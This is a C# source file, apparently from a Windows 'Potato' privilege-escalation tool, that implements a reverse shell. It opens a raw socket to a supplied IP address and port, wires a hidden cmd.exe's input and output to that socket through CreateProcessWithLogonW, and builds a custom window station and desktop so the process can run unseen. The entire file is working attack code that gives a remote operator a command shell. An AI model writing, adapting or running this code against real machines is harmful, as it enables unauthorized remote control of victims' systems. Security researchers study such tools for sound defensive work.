using System;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Reflection;

namespace Potato
{
    class ShellZz
    {
        // Super special thanks to @cneeliz for letting me borrow his sharpcat code!
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetProcessWindowStation();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessWindowStation(IntPtr hWinSta);

        [DllImport("user32.dll", EntryPoint = "CreateDesktopW", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateDesktop(
            string lpszDesktop, 
            IntPtr lpszDevice, 
            IntPtr pDevmode, 
            int dwFlags,
            int dwDesiredAccess,
            IntPtr lpsa);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);    

        [DllImport("user32.dll", EntryPoint = "CreateWindowStation", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateWindowStation(
            string name,
            int reserved,
            int desiredAccess,
            ref SECURITY_ATTRIBUTES attributes);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        //

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, BestFitMapping = false, ThrowOnUnmappableChar = true, SetLastError = true)]
        internal static extern int WSAStartup(
            [In] short wVersionRequested,
            [Out] out WSAData lpWSAData
            );

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr WSASocket(
            [In] AddressFamily addressFamily,
            [In] SocketType socketType,
            [In] ProtocolType protocolType,
            [In] IntPtr protocolInfo,
            [In] uint group,
            [In] int flags
            );

        [DllImport("ws2_32.dll", SetLastError = true)]
        internal static extern int WSAConnect(
            [In] IntPtr socketHandle,
            [In] byte[] socketAddress,
            [In] int socketAddressSize,
            [In] IntPtr inBuffer,
            [In] IntPtr outBuffer,
            [In] IntPtr sQOS,
            [In] IntPtr gQOS
            );

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct WSAData
        {
            public Int16 wVestion;
            public Int16 wHighVersion;
            public Byte szDescription;
            public Byte szSystemStatus;
            public Int16 iMaxSockets;
            public Int16 iMaxUdpDg;
            public IntPtr lpVendorInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        static bool Initialized;
        static FieldInfo m_Buffer;


        public static void ShellMain(string ip, int port)
        {
            //FreeConsole(); // closes the console
            Connect(ip, port);
        }

        public static bool Connect(string ipString, int port)
        {

            if (!Initialized)
            {
                var wsaData = new WSAData();
                if (WSAStartup(0x0202, out wsaData) != 0) return false;

                m_Buffer = typeof(SocketAddress).GetField("m_Buffer", (BindingFlags.Instance | BindingFlags.NonPublic));

                Initialized = true;
            }

            IPAddress address;
            if (!IPAddress.TryParse(ipString, out address)) return false;
            if (!((port >= 0) && (port <= 0xffff))) return false;
            var remoteEP = new IPEndPoint(address, port);

            SocketAddress socketAddress = remoteEP.Serialize();

            IntPtr m_Handle = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp, IntPtr.Zero, 0, 0);
            if (m_Handle == new IntPtr(-1)) return false;

            new SocketPermission(NetworkAccess.Connect, TransportType.Tcp, remoteEP.Address.ToString(), remoteEP.Port).Demand();

            var buf = (byte[])m_Buffer.GetValue(socketAddress);

            var result = (WSAConnect(m_Handle, buf, socketAddress.Size, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0);

            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpReserved = null;
            startupInfo.dwFlags = (0x00000001 | 0x00000100); //(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            startupInfo.hStdInput = m_Handle;
            startupInfo.hStdOutput = m_Handle;
            startupInfo.hStdError = m_Handle;
            startupInfo.lpDesktop = "potato\\default"; // ADDED

            //////// This needs to be added!
            // We need to make sure there is a desktop for the process to spawn in.
            IntPtr old_winstation = GetProcessWindowStation();
            SECURITY_ATTRIBUTES sec_attr = new SECURITY_ATTRIBUTES();
            int MAXIMUM_ALLOWED = 0x02000000;
            IntPtr new_winstation = CreateWindowStation("potato", 0, MAXIMUM_ALLOWED, ref sec_attr);
            SetProcessWindowStation(new_winstation);
            int GENERIC_ALL = 0x10000000;
            CreateDesktop("default", IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
            SetProcessWindowStation(old_winstation);
            ////////

            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            String user = "user";
            String domain = ".";
            String password = "pass";
            int LogFlags = 0x00000002; //LOGON_NETCREDENTIALS_ONLY - Change to 0x00000000 if you want to run with known credentials (RunAs)
            String appname = @"C:\Windows\System32\cmd.exe";
            String cmd = null;
            int CreateFlags = 0x08000000; //CREATE_NO_WINDOW
            String currentDir = System.IO.Directory.GetCurrentDirectory();

            try
            {
                CreateProcessWithLogonW(
                    user,
                    domain,
                    password,
                    LogFlags,
                    appname,
                    cmd,
                    CreateFlags,
                    0,
                    currentDir,
                    ref startupInfo,
                    out processInfo);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

            return result;
        }
    }
}
